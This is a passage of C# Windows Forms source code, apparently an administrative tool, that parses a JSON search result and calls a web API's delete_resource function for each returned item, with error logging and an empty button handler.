                    //             strResult = strResult.Replace("\"", "\\u022");
                    m_searchResult = new List<SearchResult>(JsonHelper.JsonDeserialize<SearchResult[]>(strResult));
                   // HttpUtility.JavaScriptStringEncode(JsonConvert.SerializeObject(yourObject))
                    for (int i = 0; i < m_searchResult.Count; i++)
                    {
                        strResult = GetWebRequestResult(GetURL("&function=delete_resource&resource=" + m_searchResult[i].Ref));
                        if (strResult.ToLower() == "error" || strResult.ToLower() == "false")
                        {
                            continue;
                        }
                    }
                }
                catch (Exception ex)
                {
                    string strMsg = "Error Remove Deleted Resource: " + ex.Message;
                    MessageBox.Show(strMsg);
                    Global.WriteToFile(strMsg, false);
                    Cursor.Current = Cursors.Default;
                }
                Cursor.Current = Cursors.Default;
                MessageBox.Show("Remove Completed");
            }
        }

        private void button3_Click_1(object sender, EventArgs e)
        {

        }





    }

}
